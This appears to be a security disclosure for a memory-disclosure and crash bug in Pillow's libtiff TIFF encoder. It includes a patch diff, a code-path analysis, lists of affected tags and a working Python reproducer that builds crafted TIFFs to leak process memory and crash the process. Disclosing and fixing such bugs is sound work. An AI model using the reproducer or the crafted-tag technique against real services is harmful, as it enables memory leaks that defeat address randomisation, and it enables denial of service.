Py_DECREF(item);\n+                    PyErr_SetString(\n+                        PyExc_ValueError,\n+                        \"Tag value does not match libtiff field definition\"\n+                    );\n+                    return NULL;\n+                }\n+            }\n         }\n \n         if (type == TIFF_BYTE || type == TIFF_UNDEFINED ||\n@@ -857,9 +991,10 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                 PyErr_SetString(PyExc_ValueError, \"Incorrect tag value type\");\n                 return NULL;\n             }\n-            status = ImagingLibTiffSetField(\n+            status = set_tiff_array_field(\n                 \u0026encoder-\u003estate,\n-                (ttag_t)key_int,\n+                key_int,\n+                passcount,\n                 PyBytes_Size(value),\n                 PyBytes_AsString(value)\n             );\n@@ -909,8 +1044,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                     for (i = 0; i \u003c len; i++) {\n                         av[i] = (UINT16)PyLong_AsLong(PyTuple_GetItem(value, i));\n                     }\n-                    status = ImagingLibTiffSetField(\n-                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n+                    status = set_tiff_array_field(\n+                        \u0026encoder-\u003estate, key_int, passcount, len, av\n                     );\n                     free(av);\n                 }\n@@ -922,8 +1057,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                     for (i = 0; i \u003c len; i++) {\n                         av[i] = (UINT32)PyLong_AsLong(PyTuple_GetItem(value, i));\n                     }\n-                    status = ImagingLibTiffSetField(\n-                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n+                    status = set_tiff_array_field(\n+                        \u0026encoder-\u003estate, key_int, passcount, len, av\n                     );\n                     free(av);\n                 }\n@@ -935,8 +1070,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                     for (i = 0; i \u003c len; i++) {\n                         av[i] = (INT8)PyLong_AsLong(PyTuple_GetItem(value, i));\n                     }\n-                    status = ImagingLibTiffSetField(\n-                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n+                    status = set_tiff_array_field(\n+                        \u0026encoder-\u003estate, key_int, passcount, len, av\n                     );\n                     free(av);\n                 }\n@@ -948,8 +1083,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                     for (i = 0; i \u003c len; i++) {\n                         av[i] = (INT16)PyLong_AsLong(PyTuple_GetItem(value, i));\n                     }\n-                    status = ImagingLibTiffSetField(\n-                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n+                    status = set_tiff_array_field(\n+                        \u0026encoder-\u003estate, key_int, passcount, len, av\n                     );\n                     free(av);\n                 }\n@@ -961,8 +1096,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                     for (i = 0; i \u003c len; i++) {\n                         av[i] = (INT32)PyLong_AsLong(PyTuple_GetItem(value, i));\n                     }\n-                    status = ImagingLibTiffSetField(\n-                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n+                    status = set_tiff_array_field(\n+                        \u0026encoder-\u003estate, key_int, passcount, len, av\n                     );\n                     free(av);\n                 }\n@@ -974,8 +1109,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                     for (i = 0; i \u003c len; i++) {\n                         av[i] = (FLOAT32)PyFloat_AsDouble(PyTuple_GetItem(value, i));\n                     }\n-                    status = ImagingLibTiffSetField(\n-                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n+                    status = set_tiff_array_field(\n+                        \u0026encoder-\u003estate, key_int, passcount, len, av\n                     );\n                     free(av);\n                 }\n@@ -987,12 +1122,12 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                     for (i = 0; i \u003c len; i++) {\n                         av[i] = PyFloat_AsDouble(PyTuple_GetItem(value, i));\n                     }\n-                    status = ImagingLibTiffSetField(\n-                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n+                    status = set_tiff_array_field(\n+                        \u0026encoder-\u003estate, key_int, passcount, len, av\n                     );\n                     free(av);\n                 }\n-            } else if (type == TIFF_RATIONAL) {\n+            } else if (type == TIFF_RATIONAL || type == TIFF_SRATIONAL) {\n                 FLOAT32 *av;\n                 /* malloc check ok, calloc checks for overflow */\n                 av = calloc(len, sizeof(FLOAT32));\n@@ -1000,8 +1135,9 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                     for (i = 0; i \u003c len; i++) {\n                         av[i] = (FLOAT32)PyFloat_AsDouble(PyTuple_GetItem(value, i));\n                     }\n-                    status =\n-                        ImagingLibTiffSetField(\u0026encoder-\u003estate, (ttag_t)key_int, av);\n+                    status = set_tiff_array_field(\n+                        \u0026encoder-\u003estate, key_int, passcount, len, av\n+                    );\n                     free(av);\n                 }\n             }\ndiff --git a/src/libImaging/TiffDecode.c b/src/libImaging/TiffDecode.c\nindex 8a57c523d..e14dd50bb 100644\n--- a/src/libImaging/TiffDecode.c\n+++ b/src/libImaging/TiffDecode.c\n@@ -923,6 +923,29 @@ ImagingLibTiffMergeFieldInfo(\n     return TIFFMergeFieldInfo(clientstate-\u003etiff, info, n);\n }\n \n+int\n+ImagingLibTiffFindField(\n+    ImagingCodecState state,\n+    int key,\n+    TIFFDataType *field_type,\n+    int *passcount,\n+    int *writecount\n+) {\n+    // Look up libtiff's own definition of a tag. TIFFMergeFieldInfo does not\n+    // replace the definition of a tag that libtiff already knows, so this is\n+    // what TIFFSetField will use for such tags.\n+    TIFFSTATE *clientstate = (TIFFSTATE *)state-\u003econtext;\n+    const TIFFField *fip = TIFFFindField(clientstate-\u003etiff, (ttag_t)key, TIFF_ANY);\n+\n+    if (!fip) {\n+        return 0;\n+    }\n+    *field_type = TIFFFieldDataType(fip);\n+    *passcount = TIFFFieldPassCount(fip);\n+    *writecount = TIFFFieldWriteCount(fip);\n+    return 1;\n+}\n+\n int\n ImagingLibTiffSetField(ImagingCodecState state, ttag_t tag, ...) {\n     // after tif_dir.c-\u003eTIFFSetField.\ndiff --git a/src/libImaging/TiffDecode.h b/src/libImaging/TiffDecode.h\nindex c31d0b9d8..ee1e4a5f9 100644\n--- a/src/libImaging/TiffDecode.h\n+++ b/src/libImaging/TiffDecode.h\n@@ -41,6 +41,14 @@ ImagingLibTiffMergeFieldInfo(\n     ImagingCodecState state, TIFFDataType field_type, int key, int is_var_length\n );\n extern int\n+ImagingLibTiffFindField(\n+    ImagingCodecState state,\n+    int key,\n+    TIFFDataType *field_type,\n+    int *passcount,\n+    int *writecount\n+);\n+extern int\n ImagingLibTiffSetField(ImagingCodecState state, ttag_t tag, ...);\n \n /*\n```\n\n## The reproducer\n\n\u003cdetails\u003e\n\u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 2,545 bytes (click to open)\u003c/summary\u003e\n\nIts last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\n```python\n#!/usr/bin/env python3\n# Pillow libtiff writer: a count-1 integer tag copied from the source TIFF is passed to\n# TIFFSetField() as one scalar vararg; for tags libtiff itself defines as arrays it is\n# consumed as a byte COUNT (DNGPrivateData 50740 -\u003e N bytes of process memory written\n# into the output) or as a POINTER (ActiveArea 50829 -\u003e SIGSEGV).  Application side is\n# the ordinary \"open upload, save as TIFF\" (compression is inherited -\u003e libtiff writer).\nimport io, struct, subprocess, sys, resource\nfrom PIL import Image\n\ndef upload(tag, value):\n    \"\"\"Pillow-written 16x16 LZW TIFF, plus one extra IFD entry \u003ctag\u003e LONG[1] = value.\"\"\"\n    b = io.BytesIO()\n    Image.new(\"RGB\", (16, 16), \"red\").save(b, \"TIFF\", compression=\"tiff_lzw\")\n    data = bytearray(b.getvalue()); assert data[:4] == b\"II*\\0\"\n    (off,) = struct.unpack_from(\"\u003cI\", data, 4)\n    (n,) = struct.unpack_from(\"\u003cH\", data, off)\n    ents = [bytes(data[off + 2 + 12 * i: off + 14 + 12 * i]) for i in range(n)]\n    ents.append(struct.pack(\"\u003cHHII\", tag, 4, 1, value))\n    ents.sort(key=lambda e: struct.unpack_from(\"\u003cH\", e)[0])\n    data += b\"\\0\" * (len(data) \u0026 1); new_off = len(data)\n    data += struct.pack(\"\u003cH\", len(ents)) + b\"\".join(ents) + struct.pack(\"\u003cI\", 0)\n    struct.pack_into(\"\u003cI\", data, 4, new_off)\n    return bytes(data)\n\ndef resave(src):                       # the whole \"service\"\n    im = Image.open(io.BytesIO(src)); out = io.BytesIO(); im.save(out, \"TIFF\")\n    return out.getvalue()\n\nif len(sys.argv) \u003e 1 and sys.argv[1] == \"child\":\n    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))\n    resave(upload(50829, 64)); sys.exit(0)\n\nprint(\"PIL core:\", Image.core.__file__)\nctl = Image.open(io.BytesIO(resave(upload(65000, 4096)))).tag_v2.get(65000)\nprint(\"control  tag 65000=4096 -\u003e\", repr(ctl))\n\nN = 65536\nsrc = upload(50740, N)\ntry:\n    v = Image.open(io.BytesIO(resave(src))).tag_v2.get(50740)\nexcept (ValueError, RuntimeError) as e:   # a fixed Pillow may reject the tag\n    v = e\nleak = isinstance(v, bytes) and len(v) == N and v[:64] not in src\nprint(f\"leak     tag 50740={N} from a {len(src)}-byte upload -\u003e\",\n      f\"{len(v)} bytes not present in input, head {v[:32].hex()}\" if leak else repr(v)[:80])\nif leak:\n    so = open(Image.core.__file__, \"rb\").read()\n    print(\"         leaked bytes found in _imaging.so at file offset\", hex(so.find(v[:256])))\n\nrc = subprocess.call([sys.executable, __file__, \"child\"])\ncrash = rc in (-11, 139)\nprint(\"crash    tag 50829=64 -\u003e child exit\", rc, \"(SIGSEGV)\" if crash else \"\")\nprint(\"BUG\" if leak or crash else \"OK\")\n```\n\u003c/details\u003e\n\n---",
                "text": "```\n============================================================================\nMemory disclosure and segfault in libtiff encoder via crafted TIFF tags\nLocation: src/encode.c:1014  in PyImaging_LibTiffEncoderNew()\nCommit:   a707c6b21c313880d0771e54965d142dd42358b6\n============================================================================\n```\n\nA crafted TIFF file of a few hundred bytes makes Pillow copy an attacker-chosen amount of its own process memory into the TIFF it writes back out, or crash the process outright. The trigger is an ordinary `Image.open()` followed by a bare `im.save(fp, \"TIFF\")`. The only precondition is that the application re-saves images as TIFF. When the uploaded file is compressed, Pillow routes that save through libtiff automatically, with no options from the application. The attached reproducer does this with a 356-byte LZW TIFF: one crafted tag comes back holding 65536 bytes taken from `_imaging.so`'s read-only data, and a second crafted tag makes the worker die with SIGSEGV on every run.\n\nThe bug is in `PyImaging_LibTiffEncoderNew` (`src/encode.c`). It decides what arguments to pass to the variadic `TIFFSetField()` from the shape of the Python value (scalar, tuple or bytes). It assumes its `ImagingLibTiffMergeFieldInfo()` call defined how libtiff will read them. But `TIFFMergeFieldInfo()` never overrides libtiff's built-in field table, so libtiff reads the arguments according to its own definition of the tag:\n\n- For a counted array tag such as DNGPrivateData (50740), a count-1 integer in the source file is taken as the byte count. The data pointer is then read from an argument slot Pillow never wrote, and that many bytes are copied into the output.\n- For a fixed-size array tag such as ActiveArea (50829), the integer itself is used as the source address.\n\nWhere that unwritten slot points depends on the compiler. In the tested clang build it points into `_imaging.so`, and a larger count returned thousands of pointers into libpython, libc and libtiff, which defeats address-space randomisation for anyone chaining another bug. When the application preserves metadata with `tiffinfo=im.tag_v2`, a 64-bit entry turns ActiveArea into a 16-byte read from an address the attacker chooses. All observed memory errors are reads; no out-of-bounds write was found.\n\nOther branches of the same loop share the defect and are reachable from crafted TIFFs or from EXIF in JPEG/PNG/WebP re-saved as compressed TIFF. These are the `bytes`, RATIONAL-tuple and typed-tuple branches, and a BYTE-typed ColorMap. The file-reachable forwarding was introduced in `a3d45e9cefd0` (\"Added custom int and float TIFF tags\") and first released in 5.4.0.\n\n## Details\n\n`PyImaging_LibTiffEncoderNew` (`src/encode.c:777-1060`) chooses the argument\nlist it hands to the variadic `TIFFSetField()` from the *Python* value of each\ntag — scalar vs. tuple vs. `bytes`, and a type that is either autodetected or\ncopied from the source file's IFD — and assumes that its own\n`ImagingLibTiffMergeFieldInfo()` registration defines how libtiff will read the\n`va_list`. It does not: libtiff keeps its built-in definition for every tag it\nalready knows, and core tags are never registered at all. libtiff therefore\nconsumes the varargs as `(count, pointer)`, `(pointer)` or three pointers\naccording to *its* field table, whatever Pillow actually pushed. The encoder\nnever consults that table (`TIFFFindField` / `TIFFFieldPassCount` /\n`TIFFFieldWriteCount` / `TIFFFieldDataType`) before the call.\n\nThe most severe instance, and the one the attached reproducer exercises: when a\nTIFF is re-saved through the libtiff writer, every tag of the source IFD that\nPillow does not recognise is forwarded to libtiff with `TIFFSetField()`. A\ncount-1 integer entry is passed as a single scalar vararg. If libtiff's own\nfield table defines that tag number as an *array* field, libtiff consumes the\nvarargs as `(count, pointer)` or `(pointer)` instead, so the attacker's integer\nbecomes either the number of bytes to copy from a never-written vararg slot, or\nthe source address itself. The same mismatch is reachable through the typed\ntuple branches (tuple length consumed as a pointer for fixed-count built-in\ntags such as `CFARepeatPatternDim`, even when the source file is well-formed),\nthe `bytes`, `TIFF_RATIONAL`-tuple and core-tag branches of the same loop;\nthose are listed\nunder *Other branches with the same defect* below and need to be covered by the\nsame fix.\n\nA 181-byte TIFF (16×16 RGB, one LZW strip, plus one extra IFD entry\n`50740 / LONG / count 1 / value 4096` — DNGPrivateData) opened with\n`Image.open()` and saved with a bare `im.save(buf, \"TIFF\")` produces a 4296-byte\noutput whose tag 50740 holds 4096 bytes that occur nowhere in the input; scanning\n`/proc/self/mem` finds them in the read-only data segment of `_imaging.so`.\nChanging the extra entry to `50829 / LONG / 1 / 64` (ActiveArea) makes the same\ntwo calls segfault in `memcpy(dst, src=0x40, n=16)` under\n`ImagingLibTiffSetField` ← `PyImaging_LibTiffEncoderNew`. An ASan build of the\nextensions reports `READ of size 4096` in `memcpy` called from\n`src/encode.c:1014` for the first input.\n\n### Code path\n\n`_save` copies all tags of the opened image into the libtiff attribute list.\nFor a tag that is neither in `LIBTIFF_CORE` nor in `TiffTags.TAGS_V2`, no type\nis recorded, so the value goes through untyped:\n\n```python\n# src/PIL/TiffImagePlugin.py:1782\nsupplied_tags = {**legacy_ifd, **getattr(im, \"tag_v2\", {})}\n…\n# :1959-1982\nfor tag, value in itertools.chain(ifd.items(), supplied_tags.items()):\n    if tag not in TiffTags.LIBTIFF_CORE:\n        …\n        elif isinstance(value, (int, float, str, bytes)) or …:\n            type = TiffTags.lookup(tag).type      # None for 50740, 50829, …\n            if type:\n                types[tag] = type\n    if tag not in atts and tag not in blocklist:\n        …\n            atts[tag] = value                     # plain int 4096\n```\n\n`compression` defaults to the source image's `im.info[\"compression\"]`\n(`TiffImagePlugin.py:1731-1746`), so a compressed source selects the libtiff\nwriter without the application asking for it.\n\nIn the encoder the untyped `int` is autodetected as `TIFF_LONG`\n(`src/encode.c:805-815`), the tag is \"registered\" as a scalar custom field, and\nthen set with one 32-bit vararg:\n\n```c\n// src/encode.c:844      (is_var_length = 0 → writecount 1, passcount 0)\nif (ImagingLibTiffMergeFieldInfo(\u0026encoder-\u003estate, type, key_int, is_var_length)) {\n    … continue;\n}\n…\n// src/encode.c:1013-1016\n} else if (type == TIFF_LONG || type == TIFF_IFD) {\n    status = ImagingLibTiffSetField(\n        \u0026encoder-\u003estate, (ttag_t)key_int, (UINT32)PyLong_AsLong(value)\n    );\n```\n\nThe registration does not do what the caller assumes. `TIFFMergeFieldInfo()`\nonly adds definitions for tags libtiff does not already know and returns 0\n(success) either way, so for tags in libtiff's built-in table the built-in\ndefinition stays in force. Queried against the linked libtiff 4.5.0 after\nexactly Pillow's merge call:\n\n```\n50740 DNGPrivateData      type=BYTE   passcount=1 writecount=-1   (unchanged)\n50829 ActiveArea          type=LONG   passcount=0 writecount=4    (unchanged)\n65000 CustomField         type=LONG   passcount=0 writecount=1    (Pillow's definition, tag was unknown)\n```\n\nlibtiff's setter for `FIELD_CUSTOM` tags then interprets the `va_list`\naccording to *its* definition: for `passcount=1` it reads `va_arg(ap, int)` as\nthe element count — the attacker's 4096 — allocates `count * size` bytes and\n`memcpy`s that many bytes from `va_arg(ap, void *)`, a slot\n`PyImaging_LibTiffEncoderNew` never wrote. On x86-64 that slot is register\n`rcx`; in this build it holds a pointer into `_imaging.so`'s `.rodata`, so the\ncopy succeeds deterministically (a value of 2 000 000 also succeeds and yields a\n2 000 200-byte output). `TIFFWriteDirectory` writes the copied bytes into the\noutput file as the tag's value. For fixed-count array fields (`passcount=0`,\n`writecount=4` for ActiveArea) there is no count argument, so the attacker's\nscalar is consumed as the `void *` source and 16 bytes are read from address\n64 → SIGSEGV.\n\nTags in libtiff 4.5's built-in table that Pillow forwards untyped and that take\nthe `(count, pointer)` form include DNGPrivateData 50740, CFAPattern 33422,\nCFAPlaneColor 50710, LinearizationTable 50712, BlackLevel 50714, WhiteLevel\n50717, ColorMatrix1/2 50721/50722, AsShotNeutral 50728, OriginalRawFileName/Data\n50827/50828, AsShotICCProfile 50831, CurrentICCProfile 50833. Fixed-count ones\n(pointer only → crash) include ActiveArea 50829, DNGVersion/DNGBackwardVersion\n50706/50707, DefaultScale/DefaultCropOrigin/DefaultCropSize 50718–50720,\nAsShotWhiteXY 50729, CFARepeatPatternDim 33421, BlackLevelRepeatDim 50713,\nImageLayer 34732, RawDataUniqueID 50781.\n\nWhen the application saves with `tiffinfo=im.tag_v2` (the documented way to\npreserve metadata), the file-declared type is honoured, and a `LONG8` entry\nreaches the `(uint64_t)PyLong_AsLongLong(value)` branch at\n`src/encode.c:1049-1052`. For ActiveArea that is a 16-byte read from a full\n64-bit attacker-chosen address into the output: a source entry\n`50829 / LONG8 / 1 / \u003caddress of a Python bytes object\u003e` produced an output\nActiveArea of `(b'SECR', b'ET-T', b'OKEN', b'-012')` in testing.\n\nThe comment above `blocklist +=` at `TiffImagePlugin.py:1938-1944` already notes\nthat array tags with the wrong length \"will result in segfaults\"; the blocklist\ncovers only a handful of tags Pillow itself knows, not the ones libtiff knows and\nPillow does not. Forwarding of these tags was introduced in `a3d45e9cefd0`\n(\"Added custom int and float TIFF tags\", 2018-10-25), first released in 5.4.0;\nreleases 2.0.0–3.0.0 forwarded them as scalars too, until `9fa6634f4`\n(\"Partial fix for #1597\") limited `_save` to `LIBTIFF_CORE`.\n\n### Other branches with the same defect\n\nThe scalar-integer branch above is one of several places in the same loop\nwhere the call shape is derived from the Python value rather than from\nlibtiff's definition. All of the following were confirmed on this commit (stock\nbuild crashes and/or ASan reports, stack always `memcpy ← libtiff ←\nImagingLibTiffSetField src/libImaging/TiffDecode.c:934 ←\nPyImaging_LibTiffEncoderNew`), and all are reachable from a sub-1 KB crafted\nfile followed by an ordinary `save()`:\n\n* **Typed tuple → `(len, av)` for a fixed-count built-in field**\n  (`src/encode.c:904-994`, the SHORT/LONG/SBYTE/SSHORT/SLONG/FLOAT/DOUBLE\n  tuple branches all call `ImagingLibTiffSetField(..., len, av)`). For libtiff\n  built-in fields with `passcount=0` and a fixed `writecount` —\n  `CFARepeatPatternDim` 33421 (SHORT×2), `BlackLevelRepeatDim` 50713\n  (SHORT×2), `ImageLayer` 34732 (LONG×2), `ActiveArea` 50829 (LONG×4),\n  `MatrixWorldToScreen/Camera` 33305/33306 (FLOAT×16) — libtiff takes the\n  *first* vararg as the source pointer, so the tuple length becomes the\n  `memcpy` source address. A perfectly well-formed 206-byte 8×8 PackBits TIFF\n  carrying `33421 / SHORT / 2 / (2, 2)` re-saved with a bare\n  `im.save(out, \"TIFF\")` dies with SIGSEGV in `memcpy` (gdb: `rsi = 0x2`, the\n  tuple length) on every run; so does\n  `Image.new(\"L\", (8, 8)).save(buf, \"TIFF\", compression=\"packbits\",\n  tiffinfo={33421: (2, 2)})`, and a JPEG whose EXIF carries the tag saved with\n  `exif=im.getexif()` into a compressed TIFF. `bytes` values for built-in\n  fixed-count BYTE tags (e.g. `DNGVersion` 50706, BYTE×4) crash the same way\n  through the `(PyBytes_Size, PyBytes_AsString)` call at `src/encode.c:860-865`.\n  The mirror image for `passcount=1` fields: `Photoshop` 34377 declared\n  SHORT, count 1, value 60000 takes the scalar branch at `:1009-1012`, libtiff\n  reads 60000 as the count and an unpassed vararg as the pointer, and the\n  re-save *succeeds* with a 60162-byte output whose tag 34377 holds 60000 bytes\n  of process memory (here C prototype strings from `_imaging.so`'s `.rodata`).\n* **`bytes` value → single `char *`** (`src/encode.c:805-815` autodetects\n  `bytes` as `TIFF_ASCII`; `:1033-1042` passes `PyBytes_AsString(value)` alone).\n  `ImageFileDirectory_v2._setitem` stores a BYTE-typed entry as bare `bytes`\n  and an ASCII-typed one as `str` (encoded to `bytes` by `_save`), so the\n  file's declared type selects this branch.\n  - `ColorMap` (320) declared BYTE with 4 bytes of data in a non-palette\n    PackBits TIFF: 320 is in `core_tags[]`, no type is consulted, the value\n    skips the 768-tuple `TIFFTAG_COLORMAP` branch (`:871-895`) and libtiff reads\n    three `uint16_t *` and copies `1 \u003c\u003c BitsPerSample` shorts from each — a\n    512-byte over-read of the 5-byte Python bytes buffer, then dereference of\n    two stale argument registers → SIGSEGV on every run of\n    `Image.open(f); im.save(out, \"TIFF\")`. `COLORMAP` is not in `_save`'s\n    `blocklist`.\n  - `Photoshop` (34377) declared ASCII: `_save` copies value *and* type\n    (`TiffImagePlugin.py:1802-1818`; only `IPTC_NAA_CHUNK` has a BYTE/UNDEFINED\n    type guard there, from commit 2245df0a — `PHOTOSHOP_CHUNK` and `XMP` do\n    not). libtiff's definition is BYTE, `passcount=1`, so the low 32 bits of\n    the `char *` become the byte count for a `memcpy` from a stale register\n    (ASan: `READ of size 3518384`; stock: SIGSEGV in about half of runs,\n    otherwise `RuntimeError`). `ICCProfile` (34675) declared ASCII behaves the\n    same way via `im.info[\"icc_profile\"]` → `ifd[ICCPROFILE]`\n    (`TiffImagePlugin.py:1822-1824`).\n* **`TIFF_RATIONAL` tuple → array with no count** (`src/encode.c:995-1006`;\n  compare the `TIFF_FLOAT` branch at `:969-981`, which passes `len, av`).\n  - For a private tag (e.g. 50000) Pillow itself registers the field with\n    `passcount=1` (`TiffDecode.c:904-908`), so libtiff takes the low 32 bits of\n    `av` as the element count and the next stale vararg as the source:\n    `heap-buffer-overflow READ of size 119872 … right of 8-byte region` under\n    ASan (`119872 == 4 * low32(av)`), SIGSEGV in ~4 of 5 stock runs. Reached by\n    a JPEG whose EXIF carries one private RATIONAL×2 tag saved with\n    `im.save(out, \"TIFF\", compression=\"tiff_lzw\", exif=im.info[\"exif\"])`, or a\n    TIFF re-saved with `tiffinfo=im.tag_v2` (`_setitem` auto-types a tuple of\n    `IFDRational` as RATIONAL, `TiffImagePlugin.py:689-701`; `types[tag] =\n    ifd.tagtype[tag]` at `:1968`).\n  - For libtiff's built-in fixed-count float tags `WhitePoint` (318, 2),\n    `PrimaryChromaticities` (319, 6) and `YCbCrCoefficients` (529, 3), which\n    `_save` forwards from any source TIFF and types RATIONAL via\n    `TiffTags.lookup`, the pointer-only convention happens to match, but\n    libtiff copies its *fixed* count from an array that is only as long as the\n    file declared: a PackBits TIFF with `PrimaryChromaticities` count 1 and a\n    bare `im.save(out, \"TIFF\")` gives `READ of size 24 … right of 4-byte\n    region`, and the over-read floats are written to tag 319 of the output.\n    `REFERENCEBLACKWHITE`/`TRANSFERFUNCTION` are blocklisted at\n    `TiffImagePlugin.py:1941-1952` for exactly this reason; 318/319/529 are not.\n* **Core tag reached as a scalar via a stale file-supplied type.** With the\n  re-save idiom `im.save(out, \"TIFF\", tiffinfo=im.tag_v2)`, `_save` copies\n  `ifd.tagtype[key] = info.tagtype[key]` for every key\n  (`TiffImagePlugin.py:1768-1776`) and later assigns its own values to some of\n  the same tags without resetting the type (`ifd[COLORMAP] = colormap` at\n  `:1870-1877`; likewise BitsPerSample, SamplesPerPixel, ExtraSamples,\n  ICCProfile, …). For a 418-byte PackBits *palette* TIFF whose ColorMap entry\n  is declared BYTE, `_setitem` (`:751-770`) truncates `_save`'s 768-entry\n  palette to a single `int` (with only a \"too many entries\" warning), the\n  encoder receives `(320, 0)`, autodetects `TIFF_LONG`, and\n  `src/encode.c:1013-1016` calls `TIFFSetField(TIFFTAG_COLORMAP, (UINT32)0)` —\n  libtiff reads three `uint16_t *` and faults at an address ≤ 65280 on every\n  run. The stale-tagtype copy is a Python-side hygiene bug in its own right,\n  but its memory-safety consequence exists only because the encoder lets a\n  non-tuple value reach `TIFFSetField(COLORMAP)`.\n\n## Impact\n\nAny service that accepts a TIFF and writes it back out as TIFF through libtiff —\nwhich happens with a plain `im.save(fp, \"TIFF\")` whenever the uploaded file is\ncompressed, or whenever a `compression=` other than raw is requested — returns\nto the uploader, inside one metadata tag of the produced file, an\nattacker-chosen number of bytes read from a stale pointer in the worker process,\ndeterministically and without retries. Which memory that is depends on the\ncompiler's register allocation for `PyImaging_LibTiffEncoderNew`: in this clang\nbuild the pointer is `_imaging.so + 0x1588`, so a request for 262 144 bytes\n(which succeeded every time in testing, as did 2 000 000) covers the\nextension's `.rodata`, `.data.rel.ro`/GOT and `.data` and returned 2 800+\nresolved pointers into libpython, libc, libtiff, libjpeg and others — a complete\nASLR bypass for chaining with any other memory bug; a gcc build of the same\nsource left a different, unrelated address in that slot. The fixed-count\nvariant kills the worker process with SIGSEGV from a 181-byte upload on every\nrequest. With `tiffinfo=im.tag_v2` the source\naddress is fully attacker-chosen (16-byte arbitrary read into the output for\nActiveArea, or a crash). No non-default Pillow setting is involved; the only\nprecondition is TIFF-to-TIFF re-encoding.\n\nThe other branches add further deterministic process-kill inputs (BYTE-typed\nColorMap in any RGB or palette TIFF; `thumbnail()` keeps `tag_v2`, so\nopen→thumbnail→save-as-TIFF is affected too) and extend the reach to\nJPEG/PNG/WebP uploads whose EXIF is preserved with `exif=` when converting to\nlibtiff-compressed TIFF. All the memory errors are reads; libtiff sizes its\ndestination buffers with the same count it copies, so no out-of-bounds write\nwas found.\n\n## Reproducing\n\n`repro` is one Python script, run against the stock build with the installed `PIL`. It needs no compiler and no extra files.\n\n`upload(tag, value)` has Pillow write a 16×16 red RGB image as an LZW-compressed TIFF, then appends a new IFD holding the same entries plus one extra `\u003ctag\u003e / LONG / count 1 / value` (kept in tag order) and points the header at it — a 356-byte input on this tree. The source is LZW-compressed on purpose. A bare `im.save(out, \"TIFF\")` keeps the source's compression, so the save goes through the libtiff writer even though the application passes no arguments. `resave()` is the whole \"application\": `Image.open(BytesIO(src)); im.save(out, \"TIFF\")`.\n\nThe script runs three cases:\n\n1. **Control, tag 65000 = 4096.** libtiff does not know this tag, so the file is re-saved correctly and the output tag reads back as the integer `4096`. This is what should happen to every tag.\n2. **Leak, DNGPrivateData 50740 = 65536.** libtiff's built-in definition of this tag is a counted BYTE array. It reads Pillow's single scalar as the *count* and takes the data pointer from a vararg slot Pillow never wrote. The output tag comes back as `bytes` of length 65536 that do not occur in the input. The script prints the first 32 of them and the file offset at which they occur in `_imaging.so` on disk. On this build they always do (offset `0x57588`): the stale pointer aims into the extension's read-only data.\n3. **Wild read, ActiveArea 50829 = 64.** libtiff defines this tag as a fixed LONG[4] array with no count, so it uses the scalar 64 as the *source address*. The script re-runs itself as a child process (`repro child`, core dumps disabled) to do this re-save, and the child exits with `-11`, meaning SIGSEGV.\n\nExpected output on the affected tree:\n\n```\ncontrol  tag 65000=4096 -\u003e 4096\nleak     tag 50740=65536 from a 356-byte upload -\u003e 65536 bytes not present in input, head a661fcffc661fcff3360fcff7b61fcffd361fcff085ffcffe061fcff3360fcff\n         leaked bytes found in _imaging.so at file offset 0x57588\ncrash    tag 50829=64 -\u003e child exit -11 (SIGSEGV)\nBUG\n```\n\nThe script prints `BUG` if case 2 leaks or case 3 crashes. Both are deterministic on this build. A fixed Pillow prints `OK`: the tag does not come back as 65536 bytes of foreign data (it reads back as `None`, or `save()` raises `ValueError`/`RuntimeError`, which the script catches), and the child exits with something other than SIGSEGV (0, or 1 if `save()` raised).\n\nThe other branches can be checked by hand on the stock build in the same way\n(each as `Image.open(f); im.save(BytesIO(), \"TIFF\")` in a child process):\na PackBits RGB TIFF with an extra IFD entry `320 / BYTE / 4 / \"ABCD\"` →\nSIGSEGV every run; a PackBits palette TIFF whose ColorMap is `320 / BYTE / 2`\nsaved with `tiffinfo=im.tag_v2` → SIGSEGV every run; a Pillow-written JPEG\nwhose EXIF holds tag 50000 = RATIONAL×2 saved with\n`compression=\"tiff_lzw\", exif=im.info[\"exif\"]` → SIGSEGV in most runs,\n`RuntimeError` (\"Failed to allocate memory for custom tag binary object\n(-N elements of 4 bytes each)\") in the rest.\n\n## Suggested fix\n\nThe encoder must not guess the calling convention; it has to ask libtiff what\nthe tag's effective definition is *after* `ImagingLibTiffMergeFieldInfo` and\nmarshal accordingly, or refuse. The attached patch does this for non-core tags:\n\n* a new `ImagingLibTiffFindField()` in `src/libImaging/TiffDecode.c` (declared\n  in `TiffDecode.h`, next to the other libtiff wrappers) returns libtiff's\n  `TIFFFindField` type, `passcount` and `writecount` for a tag;\n* in `PyImaging_LibTiffEncoderNew` (`src/encode.c`), for a non-core tag that\n  libtiff already knows, Pillow adopts libtiff's type when it has none of its\n  own, and after `ImagingLibTiffMergeFieldInfo` a new `tiff_field_matches()`\n  checks the value against libtiff's definition: a scalar only for a\n  single-value field whose C argument type (int / `uint64_t` / double /\n  `char *`) matches, an array only with libtiff's element size and, for\n  fixed-count fields, exactly `writecount` elements. Anything else raises\n  `ValueError(\"Tag value does not match libtiff field definition\")` instead of\n  reaching `TIFFSetField` — this covers the reproducer's DNGPrivateData and\n  ActiveArea inputs, ASCII-typed Photoshop, short PrimaryChromaticities and the\n  `LONG8` `tiffinfo=` variant;\n* every tuple/`bytes` branch now goes through `set_tiff_array_field()`, which\n  passes `len` only when the field has `passcount` set; this also fixes the\n  `TIFF_RATIONAL` 